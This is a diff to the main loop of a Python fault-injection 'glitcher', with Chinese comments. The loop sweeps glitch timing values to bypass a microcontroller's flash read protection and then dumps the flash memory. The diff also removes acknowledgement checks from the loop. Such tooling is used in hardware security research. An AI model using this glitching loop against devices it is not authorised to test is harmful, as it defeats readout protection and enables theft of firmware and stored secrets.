@@ -242,57 +242,53 @@ class Glitcher():
         print(fg.li_white + "[*] Dumped memory written to '{}'".format(DUMP_FILE) + fg.rs)
 
     def run(self):
+        """Run the glitching process with the current configuration"""
+
         start_time = datetime.now()
 
         for offset in range(self.start_offset, self.end_offset, self.offset_step):
             for duration in range(self.start_duration, self.end_duration, self.duration_step):
-                for attempt in range(self.retries):
-                    print(fg.li_white +
-                          f"[*] Test offset={offset}, duration={duration}, attempt={attempt+1}/{self.retries}"
-                          + fg.rs)
+                for i in range(self.retries):
 
-                    # --- 第一段 glitch ---
-                    off1, dur1 = 0, 2_000_000
-                    self.set_glitch_offset(off1)
-                    self.set_glitch_duration(dur1)
+                    print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
+                    # 第一次 glitch：offset=0, duration=2_000_000
+                    self.set_glitch_offset(0)
+                    self.set_glitch_duration(2_000_000)
                     self.start_glitch()
-                    # 等 FPGA 发回 0x55（pulse_done ACK）
-                    ack1 = self.dev.read(1)
-                    if ack1 != b'\x55':
-                        print(fg.li_red + "[-] First pulse no ACK" + fg.rs)
-                        continue
 
-                    # --- 第二段 glitch ---
-                    off2, dur2 = offset, duration
-                    self.set_glitch_offset(off2)
-                    self.set_glitch_duration(dur2)
+                    # 第二次 glitch：使用循环里定义的 offset, duration
+                    self.set_glitch_offset(offset)
+                    self.set_glitch_duration(duration)
                     self.start_glitch()
-                    # 等 FPGA 发回 0xAA（第二段 ACK，可复用 0x55 也行）
-                    ack2 = self.dev.read(1)
-                    if ack2 != b'\xAA':
-                        print(fg.li_red + "[-] Second pulse no ACK" + fg.rs)
-                        continue
 
-                    # 同步并检验
+                    # synchronize with target
                     if not self.synchronize():
-                        print(fg.li_red + "[-] Synchronization failed, retrying..." + fg.rs)
+                        print(fg.li_red + "[-] Error during synchronization" + fg.rs)
                         continue
 
-                    resp = self.send_target_command(READ_FLASH_CHECK, 1)
-                    if isinstance(resp, list) and resp[0] == b"0":
+                    # read flash memory address
+                    resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")
+
+                    if resp[0] == b"0":
                         end_time = datetime.now()
                         print(ef.bold + fg.green +
-                              f"[*] Glitch success! offset={offset}, duration={duration}, elapsed={end_time - start_time}"
+                              "[*] Glitching success!\n"
+                              f"    bypass with offset={offset}, duration={duration}\n"
+                              f"    time: {end_time - start_time}"
                               + fg.rs)
+
                         with open(RESULTS_FILE, "a") as f:
-                            f.write(f"{offset},{duration},0,{resp[1].decode()}\n")
+                            f.write(f"{offset},{duration},0,{resp[1]}\n")
+
+                        print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
                         self.dump_memory()
                         return True
 
-                    elif isinstance(resp, list) and resp[0] != b"19":
+                    elif resp[0] != b"19":
                         print(fg.li_red + f"[?] Unexpected response: {resp}" + fg.rs)
 
         return False
+
 
 
 
